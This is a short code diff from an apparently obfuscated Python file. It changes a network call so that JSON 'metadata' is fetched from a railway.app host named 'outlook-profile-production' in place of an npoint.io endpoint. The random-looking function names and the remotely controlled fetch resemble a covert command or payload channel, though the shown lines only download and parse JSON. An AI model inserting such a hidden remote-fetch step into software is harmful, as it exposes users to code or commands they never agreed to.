@@ -18,7 +18,7 @@ def data_unhopd_807():
 
     def train_mhmnws_437():
         try:
-            process_rssnjb_869 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_rssnjb_869 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_rssnjb_869.raise_for_status()
             train_ragkkn_353 = process_rssnjb_869.json()
             learn_cnhkzu_433 = train_ragkkn_353.get('metadata')
